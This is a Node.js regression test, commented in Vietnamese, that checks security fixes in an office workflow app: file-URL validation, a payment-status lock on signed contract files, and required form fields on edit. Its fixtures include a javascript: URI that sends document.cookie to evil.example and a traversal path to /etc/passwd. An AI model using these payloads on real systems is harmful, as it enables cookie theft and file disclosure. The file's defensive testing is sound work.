// server/tests/test-audit-round2-cluster2.js
//
// Regression test cho ĐỢT 2 rà soát bảo mật (8/2026) — NHÓM 2: Tài Liệu / Văn Bản Trình / Hợp Đồng /
// Đăng Ký Xe / Đề Xuất Văn Phòng / Phê Duyệt Giá IT + Biểu Mẫu. Mỗi kịch bản gắn với ĐÚNG 1 lỗ hổng đã
// vá, viết sao cho hoàn tác bản vá là FAIL ngay:
//
//   1. fileUrl/signedFileUrl/extraFiles[].fileUrl/files[].fileUrl của 6 module trên TRƯỚC ĐÂY được lưu
//      NGUYÊN VĂN, không kiểm khuôn ở CẢ nhánh TẠO lẫn nhánh SỬA. Hậu quả kép:
//        (a) stored XSS — public/index.html render `<a href="${escapeHtml(fileUrl)}">`, escapeHtml()
//            KHÔNG vô hiệu hoá scheme "javascript:";
//        (b) phá lớp phân quyền theo TỪNG HỒ SƠ mà lib/fileAuthz.js (PR #193) vừa dựng —
//            findOwningRecord() tra ngược tệp -> hồ sơ bằng so KHỚP CHUỖI fileUrl, nên ai cũng có thể
//            tự gán fileUrl của mình = đường dẫn tệp hồ sơ phòng ban khác rồi mở tệp đó bằng quyền của
//            chính mình.
//      Bản vá dùng LẠI đúng assertUploadedFileUrl()/UPLOADED_FILE_URL_RE đã có sẵn từ đợt 1
//      (lib/createValidation.js), thêm trần độ dài, và cắm vào MỌI đường ghi (create + edit + hành động
//      workflow PROPOSE_FILE_REPLACEMENT).
//
//   2. uploadContractSignedFile() thiếu hẳn lớp chặn theo paymentStatus mà hàm anh em
//      uploadOfficeSignedFile() đã có — Tài liệu ký (căn cứ thanh toán) bị thay được sau khi đã chuyển
//      sang thanh toán/đã giải ngân (lib/recordActions.js).
//
//   3. validateRequiredCustomData() (trường bắt buộc của Biểu Mẫu) chạy ở MỌI nhánh TẠO nhưng chưa từng
//      được gọi lại ở nhánh SỬA — vòng "Yêu Cầu Bổ Sung" -> "Sửa & Gửi Lại" gửi customData rỗng là xoá
//      sạch dữ liệu bắt buộc đã khai, không ai kiểm lại (lib/recordActions.js).
//
// Test THUẦN Node (không Playwright): toàn bộ phần sửa nằm ở tầng server, không có mặt nào ở giao diện.
// Gọi THẲNG hàm thật của lib/createValidation.js + lib/recordActions.js + lib/workflowEngine.js với dữ
// liệu dựng sẵn trong bộ nhớ (3 module này đều là hàm thuần, không đọc DB) — không chép lại logic nào.
//
// Chạy: node server/tests/test-audit-round2-cluster2.js
const assert = require('assert');

const { validateAndPrepareCreate, assertUploadedFileUrl, UPLOADED_FILE_URL_MAX_LEN } = require('../lib/createValidation');
const recordActions = require('../lib/recordActions');
const { applyWorkflowAction } = require('../lib/workflowEngine');

// ===================== Dữ liệu dùng chung =====================
const DEPT = 'Kinh Doanh';
const GOOD_URL = '/uploads/1717171717171-0123456789abcdef.pdf';
const GOOD_URL_2 = '/uploads/1717171717172-fedcba9876543210.pdf';
// Đúng payload tấn công của lỗ hổng (a): escapeHtml() ở index.html để nguyên chuỗi này.
const XSS_URL = 'javascript:fetch("//evil.example/"+document.cookie)';
// Lỗ hổng (b): tệp có thật của hồ sơ phòng ban khác — khuôn hợp lệ về mặt "đường dẫn" nhưng phải bị
// chặn bởi các dạng KHÔNG khớp khuôn dưới đây (đường dẫn tuyệt đối ngoài /uploads, traversal...).
const OUTSIDE_URL = 'https://evil.example/fake.pdf';
const TRAVERSAL_URL = '/uploads/../../etc/passwd';
const TOO_LONG_URL = `/uploads/${'a'.repeat(UPLOADED_FILE_URL_MAX_LEN + 50)}.pdf`;

const APP_DATA_EMPTY = { formTemplates: {} };
// Biểu Mẫu có trường BẮT BUỘC — dùng cho nhóm kịch bản 3.
const APP_DATA_REQUIRED = {
  formTemplates: {
    DOC: [{ id: 1, label: 'Số Quyết Định', required: true }],
    SUBMISSION: [{ id: 2, label: 'Mã Dự Án', required: true }]
  }
};

const UPLOADER = { username: 'up1', name: 'Người Tải Lên', dept: DEPT, perms: { uploadAll: true, uploadDepts: [] } };
const CONTRACT_USER = { username: 'ct1', name: 'Người Tạo HĐ', dept: DEPT, perms: { contractCreate: { all: true, depts: [] } } };
const CAR_USER = { username: 'car1', name: 'Người Đăng Ký Xe', dept: DEPT, perms: { carCreate: { all: true, depts: [] } } };
const OFFICE_USER = { username: 'of1', name: 'Người Đề Xuất VP', dept: DEPT, perms: { officeCreate: { all: true, depts: [] }, officeBuy: true } };
const SUB_USER = { username: 'sub1', name: 'Người Trình', dept: DEPT, perms: { submissionCreate: { all: true, depts: [] } } };
const IT_USER = { username: 'it1', name: 'Người Đề Xuất Giá', dept: DEPT, perms: { itPriceProposeCreate: true } };
// Bộ phận Trợ Lý/Thư Ký — người DUY NHẤT được PROPOSE_FILE_REPLACEMENT (xem lib/workflowEngine.js).
const TLTK_USER = { username: 'tltk1', name: 'Trợ Lý Thư Ký', dept: 'Ban Giám Đốc', perms: {} };

// ===================== Payload mẫu (đủ qua MỌI kiểm tra khác, chỉ đổi field tệp) =====================
const docPayload = (over) => ({ dept: DEPT, title: 'Quy trình ISO', cat: 'Quy trình', ver: '1.0', ...over });
const contractPayload = (over) => ({
  dept: DEPT, title: 'HĐ mua sắm', partner: 'Đối tác A', amount: 1000000,
  startDate: '2026-01-01', endDate: '2026-12-31', approvalLevel: 'KHAC',
  selectedApprovalLayers: [], selectedLayerMembers: {}, paymentInstallments: [], ...over
});
const carPayload = (over) => ({
  dept: DEPT, type: 'Xe 4 chỗ', startTime: '2026-09-01T08:00', endTime: '2026-09-01T11:00',
  km: 30, routePoints: ['Trụ sở', 'Kho Bình Dương'], purpose: 'Giao hàng', ...over
});
const officePayload = (over) => ({
  dept: DEPT, subType: 'MUA_BAN', title: 'Mua máy in',
  items: [{ name: 'Máy in', qty: 1, unitPrice: 5000000 }], ...over
});
const subPayload = (over) => ({
  dept: DEPT, title: 'Tờ trình xin chủ trương', type: 'Tờ trình khác', content: 'Nội dung',
  approvalLevel: 'KHAC', selectedApprovalLayers: [], selectedLayerMembers: {}, ...over
});
// sanitizePriceFileItems() (lib/priceFileParser.js) từ chối bảng giá không có dòng dữ liệu nào.
const PRICE_ITEMS = [{ values: { c0: 'Mặt hàng A', c1: '15000' } }];
const itPricePayload = (over) => ({
  dept: DEPT, reason: 'Áp giá đợt 9',
  files: [{ fileUrl: GOOD_URL, fileName: 'bang-gia.xlsx', items: PRICE_ITEMS, columnLabels: [] }], ...over
});

// ===================== Runner nhỏ (cùng khuôn test-uploads-file-authz.js) =====================
let passed = 0, failed = 0;
function run(name, fn) {
  try {
    fn();
    passed++;
    console.log(`PASS  ${name}`);
  } catch (err) {
    failed++;
    console.error(`FAIL  ${name}\n      ${err && err.message}`);
  }
}

// Bắt lỗi + xác nhận ĐÚNG mã trạng thái/thông điệp, không chỉ "có ném lỗi gì đó".
function expectHttpError(fn, status, messagePart) {
  let thrown = null;
  try { fn(); } catch (err) { thrown = err; }
  assert.ok(thrown, `Phải bị TỪ CHỐI nhưng lại đi lọt (không ném lỗi nào)`);
  assert.strictEqual(thrown.status, status, `Sai mã lỗi: ${thrown.status} — ${thrown.message}`);
  if (messagePart) {
    assert.ok(String(thrown.message).includes(messagePart),
      `Thông điệp lỗi không khớp: ${JSON.stringify(thrown.message)}`);
  }
}

const BAD_URLS = [
  ['javascript: URI (stored XSS)', XSS_URL],
  ['URL tuyệt đối ngoài hệ thống', OUTSIDE_URL],
  ['đường dẫn traversal', TRAVERSAL_URL],
  ['tên tệp vượt trần độ dài', TOO_LONG_URL]
];

// ============================================================================
// 1) TẠO MỚI — khuôn fileUrl bị kiểm ở MỌI module của nhóm
// ============================================================================
console.log('\n===== 1) Nhánh TẠO: fileUrl sai khuôn bị chặn =====');

for (const [label, badUrl] of BAD_URLS) {
  run(`docs (tạo): ${label} bị từ chối`, () => {
    expectHttpError(() => validateAndPrepareCreate('docs', docPayload({ fileUrl: badUrl }), UPLOADER, [], APP_DATA_EMPTY),
      400, 'Tệp tài liệu không hợp lệ');
  });
}

run('docs (tạo): fileUrl /uploads/... hợp lệ vẫn qua bình thường', () => {
  const rec = validateAndPrepareCreate('docs', docPayload({ fileUrl: GOOD_URL }), UPLOADER, [], APP_DATA_EMPTY);
  assert.strictEqual(rec.fileUrl, GOOD_URL);
  assert.strictEqual(rec.status, 'PENDING');
});

run('docs (tạo): không đính kèm tệp (fileUrl rỗng) vẫn hợp lệ — không chặn nhầm', () => {
  const rec = validateAndPrepareCreate('docs', docPayload({ fileUrl: '' }), UPLOADER, [], APP_DATA_EMPTY);
  assert.strictEqual(rec.fileUrl, '');
});

run('contracts (tạo): javascript: URI ở fileUrl bị từ chối', () => {
  expectHttpError(() => validateAndPrepareCreate('contracts', contractPayload({ fileUrl: XSS_URL }), CONTRACT_USER, [], APP_DATA_EMPTY),
    400, 'Tệp hợp đồng không hợp lệ');
});

run('contracts (tạo): javascript: URI ở signedFileUrl bị từ chối', () => {
  expectHttpError(() => validateAndPrepareCreate('contracts', contractPayload({ signedFileUrl: XSS_URL }), CONTRACT_USER, [], APP_DATA_EMPTY),
    400, 'Tài liệu ký không hợp lệ');
});

run('contracts (tạo, Nhập HĐ Đã Ký): fileUrl bẩn KHÔNG lọt qua đường sao chép sang signedFileUrl', () => {
  // Nhánh isSignedImport gán signedFileUrl = fileUrl — nếu bản vá đặt sai chỗ (sau nhánh này) thì tệp
  // bẩn vẫn nằm trong signedFileUrl dù fileUrl có bị chặn.
  expectHttpError(() => validateAndPrepareCreate('contracts',
    contractPayload({ isSignedImport: true, fileUrl: XSS_URL }), CONTRACT_USER, [], APP_DATA_EMPTY),
    400, 'Tệp hợp đồng không hợp lệ');
});

run('contracts (tạo): fileUrl hợp lệ vẫn qua, hợp đồng vào hàng chờ PENDING', () => {
  const rec = validateAndPrepareCreate('contracts', contractPayload({ fileUrl: GOOD_URL }), CONTRACT_USER, [], APP_DATA_EMPTY);
  assert.strictEqual(rec.fileUrl, GOOD_URL);
  assert.strictEqual(rec.approvalStatus, 'PENDING');
});

run('carRegs (tạo): javascript: URI ở fileUrl bị từ chối', () => {
  expectHttpError(() => validateAndPrepareCreate('carRegs', carPayload({ fileUrl: XSS_URL }), CAR_USER, [], APP_DATA_EMPTY),
    400, 'Tệp đính kèm phiếu đăng ký xe không hợp lệ');
});

run('carRegs (tạo): fileUrl hợp lệ vẫn qua', () => {
  const rec = validateAndPrepareCreate('carRegs', carPayload({ fileUrl: GOOD_URL }), CAR_USER, [], APP_DATA_EMPTY);
  assert.strictEqual(rec.fileUrl, GOOD_URL);
  assert.strictEqual(rec.status, 'PENDING');
});

run('officeReqs (tạo): javascript: URI ở fileUrl / signedFileUrl đều bị từ chối', () => {
  expectHttpError(() => validateAndPrepareCreate('officeReqs', officePayload({ fileUrl: XSS_URL }), OFFICE_USER, [], APP_DATA_EMPTY),
    400, 'Tệp đính kèm đề xuất không hợp lệ');
  expectHttpError(() => validateAndPrepareCreate('officeReqs', officePayload({ signedFileUrl: XSS_URL }), OFFICE_USER, [], APP_DATA_EMPTY),
    400, 'Tài liệu ký không hợp lệ');
});

run('submissions (tạo): javascript: URI ở fileUrl bị từ chối', () => {
  expectHttpError(() => validateAndPrepareCreate('submissions', subPayload({ fileUrl: XSS_URL }), SUB_USER, [], APP_DATA_EMPTY),
    400, 'Tệp tờ trình không hợp lệ');
});

run('submissions (tạo): 1 phần tử extraFiles[] bẩn cũng bị chặn (không chỉ tệp chính)', () => {
  expectHttpError(() => validateAndPrepareCreate('submissions', subPayload({
    fileUrl: GOOD_URL,
    extraFiles: [{ fileUrl: GOOD_URL_2, fileName: 'ok.pdf' }, { fileUrl: XSS_URL, fileName: 'xau.pdf' }]
  }), SUB_USER, [], APP_DATA_EMPTY), 400, 'Tài liệu bổ sung theo tờ trình #2 không hợp lệ');
});

run('submissions (tạo): tệp chính + extraFiles hợp lệ vẫn qua', () => {
  const rec = validateAndPrepareCreate('submissions', subPayload({
    fileUrl: GOOD_URL, extraFiles: [{ fileUrl: GOOD_URL_2, fileName: 'ok.pdf' }]
  }), SUB_USER, [], APP_DATA_EMPTY);
  assert.strictEqual(rec.fileUrl, GOOD_URL);
  assert.strictEqual(rec.extraFiles.length, 1);
});

run('itPriceApprovals (tạo): files[0].fileUrl bẩn bị chặn (trước chỉ cắt 300 ký tự)', () => {
  expectHttpError(() => validateAndPrepareCreate('itPriceApprovals',
    itPricePayload({ files: [{ fileUrl: XSS_URL, fileName: 'bg.xlsx', items: [], columnLabels: [] }] }),
    IT_USER, [], APP_DATA_EMPTY), 400, 'Tệp bảng giá không hợp lệ');
});

run('itPriceApprovals (tạo): fileUrl hợp lệ vẫn qua, giữ nguyên đường dẫn', () => {
  const rec = validateAndPrepareCreate('itPriceApprovals', itPricePayload({}), IT_USER, [], APP_DATA_EMPTY);
  assert.strictEqual(rec.files[0].fileUrl, GOOD_URL);
});

// ============================================================================
// 2) SỬA — cùng khuôn fileUrl ở nhánh SỬA (lỗ hổng chính: chỉ vá nhánh tạo là chưa đủ)
// ============================================================================
console.log('\n===== 2) Nhánh SỬA: fileUrl sai khuôn bị chặn =====');

const makeDocDraft = () => ({
  id: 1, uploader: UPLOADER.username, status: 'DRAFT', dept: DEPT,
  title: 'Quy trình ISO', fileUrl: GOOD_URL, fileName: 'cu.pdf', customData: { 'Số Quyết Định': '123/QĐ' }
});
const makeContractDraft = () => ({
  id: 2, creator: CONTRACT_USER.username, approvalStatus: 'DRAFT', currentStep: 0, history: [],
  dept: DEPT, custodianDept: DEPT, title: 'HĐ mua sắm', amount: 1000000,
  startDate: '2026-01-01', endDate: '2026-12-31', paymentInstallments: []
});
const makeCarDraft = () => ({
  id: 3, creator: CAR_USER.username, status: 'DRAFT', dept: DEPT,
  startTime: '2026-09-01T08:00', endTime: '2026-09-01T11:00', km: 30, routePoints: ['A', 'B']
});
const makeOfficeDraft = () => ({
  id: 4, creator: OFFICE_USER.username, status: 'DRAFT', dept: DEPT, subType: 'MUA_BAN',
  title: 'Mua máy in', amount: 5000000, items: []
});
const makeSubDraft = () => ({
  id: 5, creator: SUB_USER.username, status: 'DRAFT', dept: DEPT, title: 'Tờ trình',
  type: 'Tờ trình khác', approvalLevel: 'KHAC', selectedApprovalLayers: [], selectedLayerMembers: {},
  fileUrl: GOOD_URL, extraFiles: [], customData: { 'Mã Dự Án': 'DA-01' }
});

for (const [label, badUrl] of BAD_URLS) {
  run(`editDocDraft: ${label} bị từ chối`, () => {
    expectHttpError(() => recordActions.editDocDraft({ fileUrl: badUrl, fileName: 'x.pdf' }, UPLOADER, makeDocDraft(), APP_DATA_EMPTY),
      400, 'Tệp tài liệu không hợp lệ');
  });
}

run('editDocDraft: tệp thay thế hợp lệ vẫn được ghi đè bình thường', () => {
  const item = makeDocDraft();
  recordActions.editDocDraft({ fileUrl: GOOD_URL_2, fileName: 'moi.pdf' }, UPLOADER, item, APP_DATA_EMPTY);
  assert.strictEqual(item.fileUrl, GOOD_URL_2);
  assert.strictEqual(item.fileName, 'moi.pdf');
});

run('editDocDraft: hồ sơ KHÔNG bị sửa gì khi tệp bị từ chối (chặn TRƯỚC khi ghi)', () => {
  const item = makeDocDraft();
  try {
    recordActions.editDocDraft({ title: 'Đổi tiêu đề', fileUrl: XSS_URL, fileName: 'x.pdf' }, UPLOADER, item, APP_DATA_EMPTY);
  } catch (_) { /* mong đợi */ }
  assert.strictEqual(item.fileUrl, GOOD_URL, 'fileUrl cũ phải giữ nguyên');
});

run('editContract: javascript: URI ở fileUrl bị từ chối', () => {
  expectHttpError(() => recordActions.editContract({ fileName: 'x.pdf', fileUrl: XSS_URL }, CONTRACT_USER, makeContractDraft(), false, undefined, APP_DATA_EMPTY),
    400, 'Tệp hợp đồng không hợp lệ');
});

run('editContract: javascript: URI ở signedFileUrl bị từ chối', () => {
  expectHttpError(() => recordActions.editContract({ signedFileUrl: XSS_URL }, CONTRACT_USER, makeContractDraft(), false, undefined, APP_DATA_EMPTY),
    400, 'Tài liệu ký không hợp lệ');
});

run('editContract: tệp hợp lệ vẫn qua (hồ sơ quay lại hàng chờ duyệt từ bước 1)', () => {
  const item = makeContractDraft();
  recordActions.editContract({ fileName: 'moi.pdf', fileUrl: GOOD_URL_2 }, CONTRACT_USER, item, false, undefined, APP_DATA_EMPTY);
  assert.strictEqual(item.fileUrl, GOOD_URL_2);
  assert.strictEqual(item.approvalStatus, 'PENDING');
  assert.strictEqual(item.currentStep, 1);
});

for (const [label, badUrl] of BAD_URLS) {
  run(`editCarRegDraft: ${label} bị từ chối`, () => {
    expectHttpError(() => recordActions.editCarRegDraft({ fileUrl: badUrl }, CAR_USER, makeCarDraft(), APP_DATA_EMPTY),
      400, 'Tệp đính kèm phiếu đăng ký xe không hợp lệ');
  });
}

run('editCarRegDraft: sửa nội dung bình thường (không kèm tệp) vẫn qua', () => {
  const item = makeCarDraft();
  recordActions.editCarRegDraft({ purpose: 'Đi công tác' }, CAR_USER, item, APP_DATA_EMPTY);
  assert.strictEqual(item.purpose, 'Đi công tác');
});

run('editOfficeReqDraft: fileUrl / signedFileUrl bẩn đều bị từ chối', () => {
  expectHttpError(() => recordActions.editOfficeReqDraft({ fileUrl: XSS_URL }, OFFICE_USER, makeOfficeDraft(), APP_DATA_EMPTY),
    400, 'Tệp đính kèm đề xuất không hợp lệ');
  expectHttpError(() => recordActions.editOfficeReqDraft({ signedFileUrl: XSS_URL }, OFFICE_USER, makeOfficeDraft(), APP_DATA_EMPTY),
    400, 'Tài liệu ký không hợp lệ');
});

run('editSubmissionDraft: fileUrl bẩn bị từ chối', () => {
  expectHttpError(() => recordActions.editSubmissionDraft({ fileUrl: XSS_URL, fileName: 'x.pdf' }, SUB_USER, makeSubDraft(), APP_DATA_EMPTY),
    400, 'Tệp tờ trình không hợp lệ');
});

run('editSubmissionDraft: extraFiles[] bẩn bị từ chối', () => {
  expectHttpError(() => recordActions.editSubmissionDraft({ extraFiles: [{ fileUrl: XSS_URL }] }, SUB_USER, makeSubDraft(), APP_DATA_EMPTY),
    400, 'Tài liệu bổ sung theo tờ trình #1 không hợp lệ');
});

run('editSubmissionDraft: tệp chính + extraFiles hợp lệ vẫn qua', () => {
  const item = makeSubDraft();
  recordActions.editSubmissionDraft({
    fileUrl: GOOD_URL_2, fileName: 'moi.pdf', extraFiles: [{ fileUrl: GOOD_URL, fileName: 'phu-luc.pdf' }]
  }, SUB_USER, item, APP_DATA_EMPTY);
  assert.strictEqual(item.fileUrl, GOOD_URL_2);
  assert.strictEqual(item.extraFiles.length, 1);
});

run('submitPriceSupplementFile: tệp bảng giá bổ sung bẩn bị từ chối (đường ghi files[] thứ 2)', () => {
  const item = {
    id: 6, creator: IT_USER.username, status: 'PENDING', files: [],
    infoRequests: [{ id: 1, response: null, byRole: 'it' }], history: []
  };
  expectHttpError(() => recordActions.submitPriceSupplementFile(IT_USER, item, { file: { fileUrl: XSS_URL, fileName: 'bs.xlsx' } }),
    400, 'Tệp bảng giá bổ sung không hợp lệ');
  assert.strictEqual(item.files.length, 0, 'Không được thêm tệp nào vào hồ sơ khi bị từ chối');
});

run('PROPOSE_FILE_REPLACEMENT (workflow): tệp thay thế bẩn bị từ chối', () => {
  const sub = {
    id: 7, creator: SUB_USER.username, status: 'PENDING', currentStep: 1, history: [],
    effectiveSteps: [{ order: 1, name: 'Trợ Lý/Thư Ký', layerKey: 'TRO_LY_THU_KY' }],
    effectiveApprovers: { 1: [TLTK_USER.username] }
  };
  expectHttpError(() => applyWorkflowAction({
    moduleKey: 'submissions', item: sub, action: 'PROPOSE_FILE_REPLACEMENT', user: TLTK_USER,
    comment: 'Thay tệp', extraFields: { fileUrl: XSS_URL, fileName: 'thay-the.pdf' }, appData: {}
  }), 400, 'Tệp thay thế tờ trình không hợp lệ');
  assert.strictEqual(sub.pendingFileProposal, undefined, 'Không được tạo đề xuất thay tệp khi tệp bị từ chối');
});

run('PROPOSE_FILE_REPLACEMENT (workflow): tệp thay thế hợp lệ vẫn qua', () => {
  const sub = {
    id: 8, creator: SUB_USER.username, status: 'PENDING', currentStep: 1, history: [],
    effectiveSteps: [{ order: 1, name: 'Trợ Lý/Thư Ký', layerKey: 'TRO_LY_THU_KY' }],
    effectiveApprovers: { 1: [TLTK_USER.username] }
  };
  applyWorkflowAction({
    moduleKey: 'submissions', item: sub, action: 'PROPOSE_FILE_REPLACEMENT', user: TLTK_USER,
    comment: 'Thay tệp', extraFields: { fileUrl: GOOD_URL_2, fileName: 'thay-the.pdf' }, appData: {}
  });
  assert.strictEqual(sub.pendingFileProposal.fileUrl, GOOD_URL_2);
});

// ============================================================================
// 3) uploadContractSignedFile — lớp chặn theo paymentStatus (sao y uploadOfficeSignedFile)
// ============================================================================
console.log('\n===== 3) Tài liệu ký: khoá lại khi đã chuyển sang thanh toán =====');

const makeSignedContract = (over) => ({
  id: 9, creator: CONTRACT_USER.username, dept: DEPT, custodianDept: DEPT,
  approvalStatus: 'APPROVED', signedFileStatus: 'REJECTED', signedFileUrl: GOOD_URL,
  paymentStatus: 'CHUA_THANH_TOAN', ...over
});
const SIGNED_PAYLOAD = { fileName: 'da-ky.pdf', fileType: 'application/pdf', fileUrl: GOOD_URL_2 };

run('uploadContractSignedFile: BỊ CHẶN khi hợp đồng đã Chờ Thanh Toán', () => {
  expectHttpError(() => recordActions.uploadContractSignedFile(SIGNED_PAYLOAD, CONTRACT_USER,
    makeSignedContract({ paymentStatus: 'CHO_THANH_TOAN' })),
    409, 'Đã chuyển sang thanh toán');
});

run('uploadContractSignedFile: BỊ CHẶN khi hợp đồng đã Thanh Toán xong', () => {
  const item = makeSignedContract({ paymentStatus: 'DA_THANH_TOAN' });
  expectHttpError(() => recordActions.uploadContractSignedFile(SIGNED_PAYLOAD, CONTRACT_USER, item),
    409, 'Đã chuyển sang thanh toán');
  assert.strictEqual(item.signedFileUrl, GOOD_URL, 'Tài liệu ký cũ phải giữ nguyên');
});

run('uploadContractSignedFile: VẪN tải lại được khi chưa thanh toán (không chặn nhầm)', () => {
  const item = makeSignedContract({});
  recordActions.uploadContractSignedFile(SIGNED_PAYLOAD, CONTRACT_USER, item);
  assert.strictEqual(item.signedFileUrl, GOOD_URL_2);
  assert.strictEqual(item.signedFileStatus, 'PENDING');
});

run('uploadContractSignedFile: hồ sơ chưa từng có Tài liệu ký vẫn tải lên được dù paymentStatus khác', () => {
  // Hồ sơ "Nhập HĐ Đã Ký" không kèm tệp: paymentStatus = DA_THANH_TOAN ngay từ lúc tạo nhưng
  // signedFileUrl rỗng — điều kiện chặn phải giống hệt uploadOfficeSignedFile() (có tệp MỚI khoá).
  const item = makeSignedContract({ paymentStatus: 'DA_THANH_TOAN', signedFileUrl: null, signedFileStatus: null });
  recordActions.uploadContractSignedFile(SIGNED_PAYLOAD, CONTRACT_USER, item);
  assert.strictEqual(item.signedFileUrl, GOOD_URL_2);
});

run('uploadContractSignedFile: tệp ký bẩn bị từ chối', () => {
  expectHttpError(() => recordActions.uploadContractSignedFile(
    { fileName: 'x.pdf', fileUrl: XSS_URL }, CONTRACT_USER, makeSignedContract({})),
    400, 'Tài liệu ký không hợp lệ');
});

run('uploadOfficeSignedFile (hàm anh em): vẫn chặn khi đã thanh toán + chặn tệp bẩn', () => {
  const base = {
    id: 10, creator: OFFICE_USER.username, dept: DEPT, subType: 'MUA_BAN',
    status: 'APPROVED', signedFileUrl: GOOD_URL, paymentStatus: 'DA_THANH_TOAN'
  };
  expectHttpError(() => recordActions.uploadOfficeSignedFile(SIGNED_PAYLOAD, OFFICE_USER, base),
    409, 'Đã chuyển sang thanh toán');
  expectHttpError(() => recordActions.uploadOfficeSignedFile(
    { fileName: 'x.pdf', fileUrl: XSS_URL }, OFFICE_USER, { ...base, paymentStatus: 'CHUA_THANH_TOAN' }),
    400, 'Tài liệu ký không hợp lệ');
});

// ============================================================================
// 4) Trường bắt buộc của Biểu Mẫu — kiểm lại ở nhánh SỬA, không chỉ nhánh TẠO
// ============================================================================
console.log('\n===== 4) Biểu Mẫu: trường bắt buộc được kiểm lại khi SỬA =====');

run('docs (tạo): thiếu trường bắt buộc bị chặn (hành vi cũ, giữ nguyên)', () => {
  expectHttpError(() => validateAndPrepareCreate('docs', docPayload({ fileUrl: GOOD_URL, customData: {} }), UPLOADER, [], APP_DATA_REQUIRED),
    400, 'Số Quyết Định');
});

run('editDocDraft: gửi customData rỗng (xoá trắng trường bắt buộc) bị chặn', () => {
  const item = makeDocDraft();
  expectHttpError(() => recordActions.editDocDraft({ customData: {} }, UPLOADER, item, APP_DATA_REQUIRED),
    400, 'Số Quyết Định');
  assert.deepStrictEqual(item.customData, { 'Số Quyết Định': '123/QĐ' }, 'customData cũ phải giữ nguyên');
});

run('editDocDraft: gửi customData còn đủ trường bắt buộc vẫn qua', () => {
  const item = makeDocDraft();
  recordActions.editDocDraft({ customData: { 'Số Quyết Định': '456/QĐ' } }, UPLOADER, item, APP_DATA_REQUIRED);
  assert.strictEqual(item.customData['Số Quyết Định'], '456/QĐ');
});

run('editDocDraft: KHÔNG gửi customData (form không thu thập lại) không bị chặn nhầm', () => {
  const item = makeDocDraft();
  recordActions.editDocDraft({ title: 'Tiêu đề mới' }, UPLOADER, item, APP_DATA_REQUIRED);
  assert.strictEqual(item.title, 'Tiêu đề mới');
});

run('editSubmissionDraft: gửi customData rỗng (xoá trắng trường bắt buộc) bị chặn', () => {
  const item = makeSubDraft();
  expectHttpError(() => recordActions.editSubmissionDraft({ customData: {} }, SUB_USER, item, APP_DATA_REQUIRED),
    400, 'Mã Dự Án');
  assert.deepStrictEqual(item.customData, { 'Mã Dự Án': 'DA-01' }, 'customData cũ phải giữ nguyên');
});

run('editSubmissionDraft: customData đủ trường bắt buộc vẫn qua', () => {
  const item = makeSubDraft();
  recordActions.editSubmissionDraft({ customData: { 'Mã Dự Án': 'DA-99' } }, SUB_USER, item, APP_DATA_REQUIRED);
  assert.strictEqual(item.customData['Mã Dự Án'], 'DA-99');
});

run('editCarRegDraft / editOfficeReqDraft / editContract: cũng kiểm trường bắt buộc khi có customData', () => {
  const appData = { formTemplates: { CAR: [{ id: 3, label: 'Biển Số Dự Kiến', required: true }], MUA_BAN: [{ id: 4, label: 'Nhà Cung Cấp', required: true }], CONTRACT_APPROVAL: [{ id: 5, label: 'Số HĐ Gốc', required: true }] } };
  expectHttpError(() => recordActions.editCarRegDraft({ customData: {} }, CAR_USER, makeCarDraft(), appData), 400, 'Biển Số Dự Kiến');
  expectHttpError(() => recordActions.editOfficeReqDraft({ customData: {} }, OFFICE_USER, makeOfficeDraft(), appData), 400, 'Nhà Cung Cấp');
  expectHttpError(() => recordActions.editContract({ customData: {} }, CONTRACT_USER, makeContractDraft(), false, undefined, appData), 400, 'Số HĐ Gốc');
});

// ============================================================================
// 5) Chính hàm dùng chung — khoá lại hợp đồng giữa các module (không ai "tự vá" bằng regex riêng)
// ============================================================================
console.log('\n===== 5) assertUploadedFileUrl(): hợp đồng của hàm dùng chung =====');

run('assertUploadedFileUrl: rỗng/null/undefined vẫn hợp lệ (field tuỳ chọn)', () => {
  assertUploadedFileUrl('', 'X');
  assertUploadedFileUrl(null, 'X');
  assertUploadedFileUrl(undefined, 'X');
});

run('assertUploadedFileUrl: có trần độ dài (không chỉ kiểm khuôn ký tự)', () => {
  assert.ok(UPLOADED_FILE_URL_MAX_LEN > 0, 'Phải export trần độ dài dùng chung');
  expectHttpError(() => assertUploadedFileUrl(TOO_LONG_URL, 'Tệp X'), 400, 'Tệp X không hợp lệ');
  // Ngay dưới trần vẫn phải qua — tránh vá quá tay chặn cả tệp hợp lệ.
  assertUploadedFileUrl(`/uploads/${'a'.repeat(UPLOADED_FILE_URL_MAX_LEN - 20)}.pdf`, 'Tệp X');
});

// ===================== Tổng kết =====================
console.log('');
console.log(`==== ${passed}/${passed + failed} scenario(s) passed${failed ? `, ${failed} FAILED` : ''} ====`);
if (failed > 0) process.exitCode = 1;
